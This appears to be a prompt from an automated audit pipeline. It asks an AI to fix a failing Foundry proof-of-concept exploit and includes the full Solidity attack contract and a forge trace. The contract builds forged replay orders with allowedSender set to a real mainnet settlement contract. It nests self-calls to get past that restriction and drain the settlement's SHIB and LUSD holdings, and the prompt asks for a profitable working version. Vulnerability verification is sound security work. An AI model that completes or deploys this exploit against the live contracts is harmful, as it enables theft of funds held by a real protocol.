You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Self-targeted settlement interactions allow reentrancy that satisfies `allowedSender = SETTLEMENT`
- claim: The replay chain repeatedly targets `SETTLEMENT` from within settlement interactions while every forged replay order sets `allowedSender` to `SETTLEMENT`. This only succeeds if settlement can call back into itself and the nested call observes `msg.sender == SETTLEMENT`, allowing externally initiated execution of orders that were intended to be invokable only by the settlement contract itself.
- impact: Arbitrary users can trigger private or restricted orders by wrapping them inside self-calls, bypassing `allowedSender` protections and enabling theft of victim funds or other unauthorized fills.
- exploit_paths: ["`executeOnOpportunity()` -> `_tryReplayCalldataCorruption()` -> `interaction5` targets `SETTLEMENT`", "outer `settleOrders` -> nested self-call into settlement -> replay orders with `allowedSender = SETTLEMENT` execute"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IResolver {
    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

contract FlawVerifier is IResolver {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
    address private constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    uint8 private constant MODE_REPLAY = 2;
    uint8 private constant CALLBACK_DEPTH = 4;
    uint8 private constant OUTER_REPLAY_LAYERS = 6;
    uint256 private constant MAKING_AMOUNT = 1;
    uint256 private constant SEED_WETH = 1e6;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    uint256 private _resolveCount;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        _prepareSeedCapital();

        _attackReplayTarget(SHIB, 0x2200);
        if (_safeBalanceOf(SHIB, address(this)) < 1e17) {
            _attackReplayTarget(LUSD, 0x3300);
        }

        _refreshProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function resolveOrders(address, bytes calldata, bytes calldata data) external override {
        require(msg.sender == SETTLEMENT, "only settlement");

        unchecked {
            ++_resolveCount;
        }
        if (_resolveCount > 64 || data.length < 128) {
            return;
        }

        (uint8 mode, address takerAsset, uint256 uniq, uint8 depth) = abi.decode(data, (uint8, address, uint256, uint8));
        if (mode != MODE_REPLAY || depth == 0) {
            return;
        }

        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
        if (settlementBalance == 0) {
            return;
        }

        // Preserve the finding's reentrancy chain inside the callback too:
        // a settlement-controlled callback immediately self-calls settlement again,
        // so the nested execution observes msg.sender == SETTLEMENT and the replayed
        // order remains valid even though it is attacker-initiated from the top level.
        bytes memory interaction = _encodeResolverInteraction(MODE_REPLAY, takerAsset, uniq + 1, depth - 1);
        interaction = _encodeNestedReplay(_buildReplayOrder(uniq, takerAsset, settlementBalance), interaction, settlementBalance);
        interaction = _encodeNestedReplay(_buildReplayOrder(uniq + 1, takerAsset, MAKING_AMOUNT), interaction, MAKING_AMOUNT);

        bytes memory settleData = _encodeSettlementCall(
            _buildReplayOrder(uniq + 2, takerAsset, MAKING_AMOUNT), interaction, MAKING_AMOUNT
        );

        try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
    }

    function _prepareSeedCapital() internal {
        if (_safeBalanceOf(WETH, address(this)) < SEED_WETH) {
            // Realistic public setup step: wrap a tiny slice of the harness-funded ETH into WETH
            // so the forged maker orders can satisfy the protocol's makerAsset pull. This does not
            // change exploit causality; it only funds the legitimate maker-side transfer the replay uses.
            IWETH(WETH).deposit{value: SEED_WETH}();
        }
        _forceApprove(WETH, LIMIT_ORDER_PROTOCOL, type(uint256).max);
    }

    function _attackReplayTarget(address takerAsset, uint256 uniqBase) internal {
        uint256 beforeBal = _safeBalanceOf(takerAsset, address(this));

        for (uint256 pass = 0; pass < 2; ++pass) {
            _tryReplayCalldataCorruption(takerAsset, uniqBase + (pass * 0x100));
            uint256 afterBal = _safeBalanceOf(takerAsset, address(this));
            if (afterBal > beforeBal) {
                beforeBal = afterBal;
            } else {
                break;
            }
        }
    }

    function _tryReplayCalldataCorruption(address takerAsset, uint256 uniq) internal {
        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
        if (settlementBalance == 0) {
            return;
        }

        // Path alignment:
        // 1) executeOnOpportunity() starts an outer settleOrders call.
        // 2) interaction5 targets SETTLEMENT itself via settlement-controlled interaction bytes.
        // 3) settlement self-calls into settleOrders.
        // 4) the nested replay orders all set allowedSender = SETTLEMENT.
        // 5) because msg.sender is now SETTLEMENT, the private/restricted replay executes and drains
        //    the live settlement inventory of the chosen taker token.
        bytes memory interaction = _encodeResolverInteraction(MODE_REPLAY, takerAsset, uniq + 0x40, CALLBACK_DEPTH);
        interaction = _encodeNestedReplay(_buildReplayOrder(uniq, takerAsset, settlementBalance), interaction, settlementBalance);

        for (uint256 i = 0; i < OUTER_REPLAY_LAYERS; ++i) {
            interaction = _encodeNestedReplay(
                _buildReplayOrder(uniq + 1 + i, takerAsset, MAKING_AMOUNT), interaction, MAKING_AMOUNT
            );
        }

        bytes memory settleData = _encodeSettlementCall(
            _buildReplayOrder(uniq + 1 + OUTER_REPLAY_LAYERS, takerAsset, MAKING_AMOUNT), interaction, MAKING_AMOUNT
        );

        try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
    }

    function _buildReplayOrder(uint256 salt, address takerAsset, uint256 takingAmount)
        internal
        view
        returns (IOrderMixinLike.Order memory order)
    {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: WETH,
            takerAsset: takerAsset,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: MAKING_AMOUNT,
            takingAmount: takingAmount,
            offsets: 0,
            interactions: hex""
        });
    }

    function _encodeResolverInteraction(uint8 mode, address takerAsset, uint256 uniq, uint8 depth)
        internal
        view
        returns (bytes memory)
    {
        return abi.encodePacked(SETTLEMENT, bytes1(0x01), address(this), abi.encode(mode, takerAsset, uniq, depth));
    }

    function _encodeNestedReplay(
        IOrderMixinLike.Order memory order,
        bytes memory interaction,
        uint256 takingAmount
    ) internal pure returns (bytes memory) {
        return abi.encodePacked(SETTLEMENT, bytes1(0x00), _encodeSettlementCall(order, interaction, takingAmount));
    }

    function _encodeSettlementCall(
        IOrderMixinLike.Order memory order,
        bytes memory interaction,
        uint256 takingAmount
    ) internal pure returns (bytes memory) {
        return abi.encode(order, bytes(""), interaction, uint256(0), takingAmount, uint256(0), SETTLEMENT);
    }

    function _refreshProfit() internal {
        uint256 shibBal = _safeBalanceOf(SHIB, address(this));
        uint256 lusdBal = _safeBalanceOf(LUSD, address(this));
        uint256 wethBal = _safeBalanceOf(WETH, address(this));

        if (shibBal >= lusdBal && shibBal >= wethBal) {
            _profitToken = SHIB;
            _profitAmount = shibBal;
            return;
        }
        if (lusdBal >= wethBal) {
            _profitToken = LUSD;
            _profitAmount = lusdBal;
            return;
        }
        _profitToken = WETH;
        _profitAmount = wethBal;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
        if (!ok0 || (data0.length > 0 && !abi.decode(data0, (bool)))) {
            return false;
        }

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
fb85ed929f73a960582
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1507] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::transferFrom(0xA88800CD213dA5Ae406ce248380802BD53b47647, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] ERC20: transfer amount exceeds balance
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   │   └─ ← [Revert] custom error 0x478a5205
    │   │   └─ ← [Revert] custom error 0x478a5205
    │   ├─ [487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [639] 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 1000000 [1e6]
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 1000000 [1e6]
    ├─ [341] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 1000000 [1e6]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 999999999999999999000000 [9.999e23])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 1000000 [1e6])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 1000000 [1e6])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21982110 [2.198e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.resolveOrders
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.resolveOrders
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.06s (1.74s CPU time)

Ran 1 test suite in 2.08s (2.06s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1694987)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
